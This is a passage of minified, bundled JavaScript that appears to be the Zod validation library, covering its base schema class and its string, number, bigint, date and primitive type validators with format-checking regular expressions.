    function iE(e, t, n, r, i) {
        if (typeof t == "function" ? e !== t || !i : !t.has(e)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
        return t.set(e, n), n
    }
    var K;
    (function(e) {
        e.errToObj = t => typeof t == "string" ? {
            message: t
        } : t || {}, e.toString = t => typeof t == "string" ? t : t == null ? void 0 : t.message
    })(K || (K = {}));
    var fa, ha;
    class Qn {
        constructor(t, n, r, i) {
            this._cachedPath = [], this.parent = t, this.data = n, this._path = r, this._key = i
        }
        get path() {
            return this._cachedPath.length || (this._key instanceof Array ? this._cachedPath.push(...this._path, ...this._key) : this._cachedPath.push(...this._path, this._key)), this._cachedPath
        }
    }
    const xy = (e, t) => {
        if (tl(t)) return {
            success: !0,
            data: t.value
        };
        if (!e.common.issues.length) throw new Error("Validation failed but no issues detected.");
        return {
            success: !1,
            get error() {
                if (this._error) return this._error;
                const n = new Qt(e.common.issues);
                return this._error = n, this._error
            }
        }
    };

    function ae(e) {
        if (!e) return {};
        const {
            errorMap: t,
            invalid_type_error: n,
            required_error: r,
            description: i
        } = e;
        if (t && (n || r)) throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);
        return t ? {
            errorMap: t,
            description: i
        } : {
            errorMap: (s, a) => {
                var l, u;
                const {
                    message: c
                } = e;
                return s.code === "invalid_enum_value" ? {
                    message: c ?? a.defaultError
                } : typeof a.data > "u" ? {
                    message: (l = c ?? r) !== null && l !== void 0 ? l : a.defaultError
                } : s.code !== "invalid_type" ? {
                    message: a.defaultError
                } : {
                    message: (u = c ?? n) !== null && u !== void 0 ? u : a.defaultError
                }
            },
            description: i
        }
    }
    class le {
        constructor(t) {
            this.spa = this.safeParseAsync, this._def = t, this.parse = this.parse.bind(this), this.safeParse = this.safeParse.bind(this), this.parseAsync = this.parseAsync.bind(this), this.safeParseAsync = this.safeParseAsync.bind(this), this.spa = this.spa.bind(this), this.refine = this.refine.bind(this), this.refinement = this.refinement.bind(this), this.superRefine = this.superRefine.bind(this), this.optional = this.optional.bind(this), this.nullable = this.nullable.bind(this), this.nullish = this.nullish.bind(this), this.array = this.array.bind(this), this.promise = this.promise.bind(this), this.or = this.or.bind(this), this.and = this.and.bind(this), this.transform = this.transform.bind(this), this.brand = this.brand.bind(this), this.default = this.default.bind(this), this.catch = this.catch.bind(this), this.describe = this.describe.bind(this), this.pipe = this.pipe.bind(this), this.readonly = this.readonly.bind(this), this.isNullable = this.isNullable.bind(this), this.isOptional = this.isOptional.bind(this)
        }
        get description() {
            return this._def.description
        }
        _getType(t) {
            return Hr(t.data)
        }
        _getOrReturnCtx(t, n) {
            return n || {
                common: t.parent.common,
                data: t.data,
                parsedType: Hr(t.data),
                schemaErrorMap: this._def.errorMap,
                path: t.path,
                parent: t.parent
            }
        }
        _processInputParams(t) {
            return {
                status: new mt,
                ctx: {
                    common: t.parent.common,
                    data: t.data,
                    parsedType: Hr(t.data),
                    schemaErrorMap: this._def.errorMap,
                    path: t.path,
                    parent: t.parent
                }
            }
        }
        _parseSync(t) {
            const n = this._parse(t);
            if (nl(n)) throw new Error("Synchronous parse encountered promise.");
            return n
        }
        _parseAsync(t) {
            const n = this._parse(t);
            return Promise.resolve(n)
        }
        parse(t, n) {
            const r = this.safeParse(t, n);
            if (r.success) return r.data;
            throw r.error
        }
        safeParse(t, n) {
            var r;
            const i = {
                    common: {
                        issues: [],
                        async: (r = n == null ? void 0 : n.async) !== null && r !== void 0 ? r : !1,
                        contextualErrorMap: n == null ? void 0 : n.errorMap
                    },
                    path: (n == null ? void 0 : n.path) || [],
                    schemaErrorMap: this._def.errorMap,
                    parent: null,
                    data: t,
                    parsedType: Hr(t)
                },
                o = this._parseSync({
                    data: t,
                    path: i.path,
                    parent: i
                });
            return xy(i, o)
        }
        async parseAsync(t, n) {
            const r = await this.safeParseAsync(t, n);
            if (r.success) return r.data;
            throw r.error
        }
        async safeParseAsync(t, n) {
            const r = {
                    common: {
                        issues: [],
                        contextualErrorMap: n == null ? void 0 : n.errorMap,
                        async: !0
                    },
                    path: (n == null ? void 0 : n.path) || [],
                    schemaErrorMap: this._def.errorMap,
                    parent: null,
                    data: t,
                    parsedType: Hr(t)
                },
                i = this._parse({
                    data: t,
                    path: r.path,
                    parent: r
                }),
                o = await (nl(i) ? i : Promise.resolve(i));
            return xy(r, o)
        }
        refine(t, n) {
            const r = i => typeof n == "string" || typeof n > "u" ? {
                message: n
            } : typeof n == "function" ? n(i) : n;
            return this._refinement((i, o) => {
                const s = t(i),
                    a = () => o.addIssue({
                        code: j.custom,
                        ...r(i)
                    });
                return typeof Promise < "u" && s instanceof Promise ? s.then(l => l ? !0 : (a(), !1)) : s ? !0 : (a(), !1)
            })
        }
        refinement(t, n) {
            return this._refinement((r, i) => t(r) ? !0 : (i.addIssue(typeof n == "function" ? n(r, i) : n), !1))
        }
        _refinement(t) {
            return new Cn({
                schema: this,
                typeName: ee.ZodEffects,
                effect: {
                    type: "refinement",
                    refinement: t
                }
            })
        }
        superRefine(t) {
            return this._refinement(t)
        }
        optional() {
            return Wn.create(this, this._def)
        }
        nullable() {
            return ui.create(this, this._def)
        }
        nullish() {
            return this.nullable().optional()
        }
        array() {
            return kn.create(this, this._def)
        }
        promise() {
            return vs.create(this, this._def)
        }
        or(t) {
            return sl.create([this, t], this._def)
        }
        and(t) {
            return al.create(this, t, this._def)
        }
        transform(t) {
            return new Cn({ ...ae(this._def),
                schema: this,
                typeName: ee.ZodEffects,
                effect: {
                    type: "transform",
                    transform: t
                }
            })
        }
        default (t) {
            const n = typeof t == "function" ? t : () => t;
            return new fl({ ...ae(this._def),
                innerType: this,
                defaultValue: n,
                typeName: ee.ZodDefault
            })
        }
        brand() {
            return new T0({
                typeName: ee.ZodBranded,
                type: this,
                ...ae(this._def)
            })
        } catch (t) {
            const n = typeof t == "function" ? t : () => t;
            return new hl({ ...ae(this._def),
                innerType: this,
                catchValue: n,
                typeName: ee.ZodCatch
            })
        }
        describe(t) {
            const n = this.constructor;
            return new n({ ...this._def,
                description: t
            })
        }
        pipe(t) {
            return Ul.create(this, t)
        }
        readonly() {
            return pl.create(this)
        }
        isOptional() {
            return this.safeParse(void 0).success
        }
        isNullable() {
            return this.safeParse(null).success
        }
    }
    const eR = /^c[^\s-]{8,}$/i,
        tR = /^[0-9a-z]+$/,
        nR = /^[0-9A-HJKMNP-TV-Z]{26}$/,
        rR = /^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,
        iR = /^[a-z0-9_-]{21}$/i,
        oR = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,
        sR = /^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,
        aR = "^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";
    let Zf;
    const lR = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,
        cR = /^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,
        uR = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,
        oE = "((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",
        dR = new RegExp(`^${oE}$`);

    function sE(e) {
        let t = "([01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d";
        return e.precision ? t = `${t}\\.\\d{${e.precision}}` : e.precision == null && (t = `${t}(\\.\\d+)?`), t
    }

    function fR(e) {
        return new RegExp(`^${sE(e)}$`)
    }

    function aE(e) {
        let t = `${oE}T${sE(e)}`;
        const n = [];
        return n.push(e.local ? "Z?" : "Z"), e.offset && n.push("([+-]\\d{2}:?\\d{2})"), t = `${t}(${n.join("|")})`, new RegExp(`^${t}$`)
    }

    function hR(e, t) {
        return !!((t === "v4" || !t) && lR.test(e) || (t === "v6" || !t) && cR.test(e))
    }
    class En extends le {
        _parse(t) {
            if (this._def.coerce && (t.data = String(t.data)), this._getType(t) !== V.string) {
                const o = this._getOrReturnCtx(t);
                return z(o, {
                    code: j.invalid_type,
                    expected: V.string,
                    received: o.parsedType
                }), te
            }
            const r = new mt;
            let i;
            for (const o of this._def.checks)
                if (o.kind === "min") t.data.length < o.value && (i = this._getOrReturnCtx(t, i), z(i, {
                    code: j.too_small,
                    minimum: o.value,
                    type: "string",
                    inclusive: !0,
                    exact: !1,
                    message: o.message
                }), r.dirty());
                else if (o.kind === "max") t.data.length > o.value && (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.too_big,
                maximum: o.value,
                type: "string",
                inclusive: !0,
                exact: !1,
                message: o.message
            }), r.dirty());
            else if (o.kind === "length") {
                const s = t.data.length > o.value,
                    a = t.data.length < o.value;
                (s || a) && (i = this._getOrReturnCtx(t, i), s ? z(i, {
                    code: j.too_big,
                    maximum: o.value,
                    type: "string",
                    inclusive: !0,
                    exact: !0,
                    message: o.message
                }) : a && z(i, {
                    code: j.too_small,
                    minimum: o.value,
                    type: "string",
                    inclusive: !0,
                    exact: !0,
                    message: o.message
                }), r.dirty())
            } else if (o.kind === "email") sR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "email",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "emoji") Zf || (Zf = new RegExp(aR, "u")), Zf.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "emoji",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "uuid") rR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "uuid",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "nanoid") iR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "nanoid",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "cuid") eR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "cuid",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "cuid2") tR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "cuid2",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "ulid") nR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "ulid",
                code: j.invalid_string,
                message: o.message
            }), r.dirty());
            else if (o.kind === "url") try {
                new URL(t.data)
            } catch {
                i = this._getOrReturnCtx(t, i), z(i, {
                    validation: "url",
                    code: j.invalid_string,
                    message: o.message
                }), r.dirty()
            } else o.kind === "regex" ? (o.regex.lastIndex = 0, o.regex.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "regex",
                code: j.invalid_string,
                message: o.message
            }), r.dirty())) : o.kind === "trim" ? t.data = t.data.trim() : o.kind === "includes" ? t.data.includes(o.value, o.position) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: {
                    includes: o.value,
                    position: o.position
                },
                message: o.message
            }), r.dirty()) : o.kind === "toLowerCase" ? t.data = t.data.toLowerCase() : o.kind === "toUpperCase" ? t.data = t.data.toUpperCase() : o.kind === "startsWith" ? t.data.startsWith(o.value) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: {
                    startsWith: o.value
                },
                message: o.message
            }), r.dirty()) : o.kind === "endsWith" ? t.data.endsWith(o.value) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: {
                    endsWith: o.value
                },
                message: o.message
            }), r.dirty()) : o.kind === "datetime" ? aE(o).test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: "datetime",
                message: o.message
            }), r.dirty()) : o.kind === "date" ? dR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: "date",
                message: o.message
            }), r.dirty()) : o.kind === "time" ? fR(o).test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.invalid_string,
                validation: "time",
                message: o.message
            }), r.dirty()) : o.kind === "duration" ? oR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "duration",
                code: j.invalid_string,
                message: o.message
            }), r.dirty()) : o.kind === "ip" ? hR(t.data, o.version) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "ip",
                code: j.invalid_string,
                message: o.message
            }), r.dirty()) : o.kind === "base64" ? uR.test(t.data) || (i = this._getOrReturnCtx(t, i), z(i, {
                validation: "base64",
                code: j.invalid_string,
                message: o.message
            }), r.dirty()) : pe.assertNever(o);
            return {
                status: r.value,
                value: t.data
            }
        }
        _regex(t, n, r) {
            return this.refinement(i => t.test(i), {
                validation: n,
                code: j.invalid_string,
                ...K.errToObj(r)
            })
        }
        _addCheck(t) {
            return new En({ ...this._def,
                checks: [...this._def.checks, t]
            })
        }
        email(t) {
            return this._addCheck({
                kind: "email",
                ...K.errToObj(t)
            })
        }
        url(t) {
            return this._addCheck({
                kind: "url",
                ...K.errToObj(t)
            })
        }
        emoji(t) {
            return this._addCheck({
                kind: "emoji",
                ...K.errToObj(t)
            })
        }
        uuid(t) {
            return this._addCheck({
                kind: "uuid",
                ...K.errToObj(t)
            })
        }
        nanoid(t) {
            return this._addCheck({
                kind: "nanoid",
                ...K.errToObj(t)
            })
        }
        cuid(t) {
            return this._addCheck({
                kind: "cuid",
                ...K.errToObj(t)
            })
        }
        cuid2(t) {
            return this._addCheck({
                kind: "cuid2",
                ...K.errToObj(t)
            })
        }
        ulid(t) {
            return this._addCheck({
                kind: "ulid",
                ...K.errToObj(t)
            })
        }
        base64(t) {
            return this._addCheck({
                kind: "base64",
                ...K.errToObj(t)
            })
        }
        ip(t) {
            return this._addCheck({
                kind: "ip",
                ...K.errToObj(t)
            })
        }
        datetime(t) {
            var n, r;
            return typeof t == "string" ? this._addCheck({
                kind: "datetime",
                precision: null,
                offset: !1,
                local: !1,
                message: t
            }) : this._addCheck({
                kind: "datetime",
                precision: typeof(t == null ? void 0 : t.precision) > "u" ? null : t == null ? void 0 : t.precision,
                offset: (n = t == null ? void 0 : t.offset) !== null && n !== void 0 ? n : !1,
                local: (r = t == null ? void 0 : t.local) !== null && r !== void 0 ? r : !1,
                ...K.errToObj(t == null ? void 0 : t.message)
            })
        }
        date(t) {
            return this._addCheck({
                kind: "date",
                message: t
            })
        }
        time(t) {
            return typeof t == "string" ? this._addCheck({
                kind: "time",
                precision: null,
                message: t
            }) : this._addCheck({
                kind: "time",
                precision: typeof(t == null ? void 0 : t.precision) > "u" ? null : t == null ? void 0 : t.precision,
                ...K.errToObj(t == null ? void 0 : t.message)
            })
        }
        duration(t) {
            return this._addCheck({
                kind: "duration",
                ...K.errToObj(t)
            })
        }
        regex(t, n) {
            return this._addCheck({
                kind: "regex",
                regex: t,
                ...K.errToObj(n)
            })
        }
        includes(t, n) {
            return this._addCheck({
                kind: "includes",
                value: t,
                position: n == null ? void 0 : n.position,
                ...K.errToObj(n == null ? void 0 : n.message)
            })
        }
        startsWith(t, n) {
            return this._addCheck({
                kind: "startsWith",
                value: t,
                ...K.errToObj(n)
            })
        }
        endsWith(t, n) {
            return this._addCheck({
                kind: "endsWith",
                value: t,
                ...K.errToObj(n)
            })
        }
        min(t, n) {
            return this._addCheck({
                kind: "min",
                value: t,
                ...K.errToObj(n)
            })
        }
        max(t, n) {
            return this._addCheck({
                kind: "max",
                value: t,
                ...K.errToObj(n)
            })
        }
        length(t, n) {
            return this._addCheck({
                kind: "length",
                value: t,
                ...K.errToObj(n)
            })
        }
        nonempty(t) {
            return this.min(1, K.errToObj(t))
        }
        trim() {
            return new En({ ...this._def,
                checks: [...this._def.checks, {
                    kind: "trim"
                }]
            })
        }
        toLowerCase() {
            return new En({ ...this._def,
                checks: [...this._def.checks, {
                    kind: "toLowerCase"
                }]
            })
        }
        toUpperCase() {
            return new En({ ...this._def,
                checks: [...this._def.checks, {
                    kind: "toUpperCase"
                }]
            })
        }
        get isDatetime() {
            return !!this._def.checks.find(t => t.kind === "datetime")
        }
        get isDate() {
            return !!this._def.checks.find(t => t.kind === "date")
        }
        get isTime() {
            return !!this._def.checks.find(t => t.kind === "time")
        }
        get isDuration() {
            return !!this._def.checks.find(t => t.kind === "duration")
        }
        get isEmail() {
            return !!this._def.checks.find(t => t.kind === "email")
        }
        get isURL() {
            return !!this._def.checks.find(t => t.kind === "url")
        }
        get isEmoji() {
            return !!this._def.checks.find(t => t.kind === "emoji")
        }
        get isUUID() {
            return !!this._def.checks.find(t => t.kind === "uuid")
        }
        get isNANOID() {
            return !!this._def.checks.find(t => t.kind === "nanoid")
        }
        get isCUID() {
            return !!this._def.checks.find(t => t.kind === "cuid")
        }
        get isCUID2() {
            return !!this._def.checks.find(t => t.kind === "cuid2")
        }
        get isULID() {
            return !!this._def.checks.find(t => t.kind === "ulid")
        }
        get isIP() {
            return !!this._def.checks.find(t => t.kind === "ip")
        }
        get isBase64() {
            return !!this._def.checks.find(t => t.kind === "base64")
        }
        get minLength() {
            let t = null;
            for (const n of this._def.checks) n.kind === "min" && (t === null || n.value > t) && (t = n.value);
            return t
        }
        get maxLength() {
            let t = null;
            for (const n of this._def.checks) n.kind === "max" && (t === null || n.value < t) && (t = n.value);
            return t
        }
    }
    En.create = e => {
        var t;
        return new En({
            checks: [],
            typeName: ee.ZodString,
            coerce: (t = e == null ? void 0 : e.coerce) !== null && t !== void 0 ? t : !1,
            ...ae(e)
        })
    };

    function pR(e, t) {
        const n = (e.toString().split(".")[1] || "").length,
            r = (t.toString().split(".")[1] || "").length,
            i = n > r ? n : r,
            o = parseInt(e.toFixed(i).replace(".", "")),
            s = parseInt(t.toFixed(i).replace(".", ""));
        return o % s / Math.pow(10, i)
    }
    class ai extends le {
        constructor() {
            super(...arguments), this.min = this.gte, this.max = this.lte, this.step = this.multipleOf
        }
        _parse(t) {
            if (this._def.coerce && (t.data = Number(t.data)), this._getType(t) !== V.number) {
                const o = this._getOrReturnCtx(t);
                return z(o, {
                    code: j.invalid_type,
                    expected: V.number,
                    received: o.parsedType
                }), te
            }
            let r;
            const i = new mt;
            for (const o of this._def.checks) o.kind === "int" ? pe.isInteger(t.data) || (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.invalid_type,
                expected: "integer",
                received: "float",
                message: o.message
            }), i.dirty()) : o.kind === "min" ? (o.inclusive ? t.data < o.value : t.data <= o.value) && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.too_small,
                minimum: o.value,
                type: "number",
                inclusive: o.inclusive,
                exact: !1,
                message: o.message
            }), i.dirty()) : o.kind === "max" ? (o.inclusive ? t.data > o.value : t.data >= o.value) && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.too_big,
                maximum: o.value,
                type: "number",
                inclusive: o.inclusive,
                exact: !1,
                message: o.message
            }), i.dirty()) : o.kind === "multipleOf" ? pR(t.data, o.value) !== 0 && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.not_multiple_of,
                multipleOf: o.value,
                message: o.message
            }), i.dirty()) : o.kind === "finite" ? Number.isFinite(t.data) || (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.not_finite,
                message: o.message
            }), i.dirty()) : pe.assertNever(o);
            return {
                status: i.value,
                value: t.data
            }
        }
        gte(t, n) {
            return this.setLimit("min", t, !0, K.toString(n))
        }
        gt(t, n) {
            return this.setLimit("min", t, !1, K.toString(n))
        }
        lte(t, n) {
            return this.setLimit("max", t, !0, K.toString(n))
        }
        lt(t, n) {
            return this.setLimit("max", t, !1, K.toString(n))
        }
        setLimit(t, n, r, i) {
            return new ai({ ...this._def,
                checks: [...this._def.checks, {
                    kind: t,
                    value: n,
                    inclusive: r,
                    message: K.toString(i)
                }]
            })
        }
        _addCheck(t) {
            return new ai({ ...this._def,
                checks: [...this._def.checks, t]
            })
        }
        int(t) {
            return this._addCheck({
                kind: "int",
                message: K.toString(t)
            })
        }
        positive(t) {
            return this._addCheck({
                kind: "min",
                value: 0,
                inclusive: !1,
                message: K.toString(t)
            })
        }
        negative(t) {
            return this._addCheck({
                kind: "max",
                value: 0,
                inclusive: !1,
                message: K.toString(t)
            })
        }
        nonpositive(t) {
            return this._addCheck({
                kind: "max",
                value: 0,
                inclusive: !0,
                message: K.toString(t)
            })
        }
        nonnegative(t) {
            return this._addCheck({
                kind: "min",
                value: 0,
                inclusive: !0,
                message: K.toString(t)
            })
        }
        multipleOf(t, n) {
            return this._addCheck({
                kind: "multipleOf",
                value: t,
                message: K.toString(n)
            })
        }
        finite(t) {
            return this._addCheck({
                kind: "finite",
                message: K.toString(t)
            })
        }
        safe(t) {
            return this._addCheck({
                kind: "min",
                inclusive: !0,
                value: Number.MIN_SAFE_INTEGER,
                message: K.toString(t)
            })._addCheck({
                kind: "max",
                inclusive: !0,
                value: Number.MAX_SAFE_INTEGER,
                message: K.toString(t)
            })
        }
        get minValue() {
            let t = null;
            for (const n of this._def.checks) n.kind === "min" && (t === null || n.value > t) && (t = n.value);
            return t
        }
        get maxValue() {
            let t = null;
            for (const n of this._def.checks) n.kind === "max" && (t === null || n.value < t) && (t = n.value);
            return t
        }
        get isInt() {
            return !!this._def.checks.find(t => t.kind === "int" || t.kind === "multipleOf" && pe.isInteger(t.value))
        }
        get isFinite() {
            let t = null,
                n = null;
            for (const r of this._def.checks) {
                if (r.kind === "finite" || r.kind === "int" || r.kind === "multipleOf") return !0;
                r.kind === "min" ? (n === null || r.value > n) && (n = r.value) : r.kind === "max" && (t === null || r.value < t) && (t = r.value)
            }
            return Number.isFinite(n) && Number.isFinite(t)
        }
    }
    ai.create = e => new ai({
        checks: [],
        typeName: ee.ZodNumber,
        coerce: (e == null ? void 0 : e.coerce) || !1,
        ...ae(e)
    });
    class li extends le {
        constructor() {
            super(...arguments), this.min = this.gte, this.max = this.lte
        }
        _parse(t) {
            if (this._def.coerce && (t.data = BigInt(t.data)), this._getType(t) !== V.bigint) {
                const o = this._getOrReturnCtx(t);
                return z(o, {
                    code: j.invalid_type,
                    expected: V.bigint,
                    received: o.parsedType
                }), te
            }
            let r;
            const i = new mt;
            for (const o of this._def.checks) o.kind === "min" ? (o.inclusive ? t.data < o.value : t.data <= o.value) && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.too_small,
                type: "bigint",
                minimum: o.value,
                inclusive: o.inclusive,
                message: o.message
            }), i.dirty()) : o.kind === "max" ? (o.inclusive ? t.data > o.value : t.data >= o.value) && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.too_big,
                type: "bigint",
                maximum: o.value,
                inclusive: o.inclusive,
                message: o.message
            }), i.dirty()) : o.kind === "multipleOf" ? t.data % o.value !== BigInt(0) && (r = this._getOrReturnCtx(t, r), z(r, {
                code: j.not_multiple_of,
                multipleOf: o.value,
                message: o.message
            }), i.dirty()) : pe.assertNever(o);
            return {
                status: i.value,
                value: t.data
            }
        }
        gte(t, n) {
            return this.setLimit("min", t, !0, K.toString(n))
        }
        gt(t, n) {
            return this.setLimit("min", t, !1, K.toString(n))
        }
        lte(t, n) {
            return this.setLimit("max", t, !0, K.toString(n))
        }
        lt(t, n) {
            return this.setLimit("max", t, !1, K.toString(n))
        }
        setLimit(t, n, r, i) {
            return new li({ ...this._def,
                checks: [...this._def.checks, {
                    kind: t,
                    value: n,
                    inclusive: r,
                    message: K.toString(i)
                }]
            })
        }
        _addCheck(t) {
            return new li({ ...this._def,
                checks: [...this._def.checks, t]
            })
        }
        positive(t) {
            return this._addCheck({
                kind: "min",
                value: BigInt(0),
                inclusive: !1,
                message: K.toString(t)
            })
        }
        negative(t) {
            return this._addCheck({
                kind: "max",
                value: BigInt(0),
                inclusive: !1,
                message: K.toString(t)
            })
        }
        nonpositive(t) {
            return this._addCheck({
                kind: "max",
                value: BigInt(0),
                inclusive: !0,
                message: K.toString(t)
            })
        }
        nonnegative(t) {
            return this._addCheck({
                kind: "min",
                value: BigInt(0),
                inclusive: !0,
                message: K.toString(t)
            })
        }
        multipleOf(t, n) {
            return this._addCheck({
                kind: "multipleOf",
                value: t,
                message: K.toString(n)
            })
        }
        get minValue() {
            let t = null;
            for (const n of this._def.checks) n.kind === "min" && (t === null || n.value > t) && (t = n.value);
            return t
        }
        get maxValue() {
            let t = null;
            for (const n of this._def.checks) n.kind === "max" && (t === null || n.value < t) && (t = n.value);
            return t
        }
    }
    li.create = e => {
        var t;
        return new li({
            checks: [],
            typeName: ee.ZodBigInt,
            coerce: (t = e == null ? void 0 : e.coerce) !== null && t !== void 0 ? t : !1,
            ...ae(e)
        })
    };
    class rl extends le {
        _parse(t) {
            if (this._def.coerce && (t.data = !!t.data), this._getType(t) !== V.boolean) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.boolean,
                    received: r.parsedType
                }), te
            }
            return kt(t.data)
        }
    }
    rl.create = e => new rl({
        typeName: ee.ZodBoolean,
        coerce: (e == null ? void 0 : e.coerce) || !1,
        ...ae(e)
    });
    class so extends le {
        _parse(t) {
            if (this._def.coerce && (t.data = new Date(t.data)), this._getType(t) !== V.date) {
                const o = this._getOrReturnCtx(t);
                return z(o, {
                    code: j.invalid_type,
                    expected: V.date,
                    received: o.parsedType
                }), te
            }
            if (isNaN(t.data.getTime())) {
                const o = this._getOrReturnCtx(t);
                return z(o, {
                    code: j.invalid_date
                }), te
            }
            const r = new mt;
            let i;
            for (const o of this._def.checks) o.kind === "min" ? t.data.getTime() < o.value && (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.too_small,
                message: o.message,
                inclusive: !0,
                exact: !1,
                minimum: o.value,
                type: "date"
            }), r.dirty()) : o.kind === "max" ? t.data.getTime() > o.value && (i = this._getOrReturnCtx(t, i), z(i, {
                code: j.too_big,
                message: o.message,
                inclusive: !0,
                exact: !1,
                maximum: o.value,
                type: "date"
            }), r.dirty()) : pe.assertNever(o);
            return {
                status: r.value,
                value: new Date(t.data.getTime())
            }
        }
        _addCheck(t) {
            return new so({ ...this._def,
                checks: [...this._def.checks, t]
            })
        }
        min(t, n) {
            return this._addCheck({
                kind: "min",
                value: t.getTime(),
                message: K.toString(n)
            })
        }
        max(t, n) {
            return this._addCheck({
                kind: "max",
                value: t.getTime(),
                message: K.toString(n)
            })
        }
        get minDate() {
            let t = null;
            for (const n of this._def.checks) n.kind === "min" && (t === null || n.value > t) && (t = n.value);
            return t != null ? new Date(t) : null
        }
        get maxDate() {
            let t = null;
            for (const n of this._def.checks) n.kind === "max" && (t === null || n.value < t) && (t = n.value);
            return t != null ? new Date(t) : null
        }
    }
    so.create = e => new so({
        checks: [],
        coerce: (e == null ? void 0 : e.coerce) || !1,
        typeName: ee.ZodDate,
        ...ae(e)
    });
    class Lu extends le {
        _parse(t) {
            if (this._getType(t) !== V.symbol) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.symbol,
                    received: r.parsedType
                }), te
            }
            return kt(t.data)
        }
    }
    Lu.create = e => new Lu({
        typeName: ee.ZodSymbol,
        ...ae(e)
    });
    class il extends le {
        _parse(t) {
            if (this._getType(t) !== V.undefined) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.undefined,
                    received: r.parsedType
                }), te
            }
            return kt(t.data)
        }
    }
    il.create = e => new il({
        typeName: ee.ZodUndefined,
        ...ae(e)
    });
    class ol extends le {
        _parse(t) {
            if (this._getType(t) !== V.null) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.null,
                    received: r.parsedType
                }), te
            }
            return kt(t.data)
        }
    }
    ol.create = e => new ol({
        typeName: ee.ZodNull,
        ...ae(e)
    });
    class gs extends le {
        constructor() {
            super(...arguments), this._any = !0
        }
        _parse(t) {
            return kt(t.data)
        }
    }
    gs.create = e => new gs({
        typeName: ee.ZodAny,
        ...ae(e)
    });
    class Vi extends le {
        constructor() {
            super(...arguments), this._unknown = !0
        }
        _parse(t) {
            return kt(t.data)
        }
    }
    Vi.create = e => new Vi({
        typeName: ee.ZodUnknown,
        ...ae(e)
    });
    class Ar extends le {
        _parse(t) {
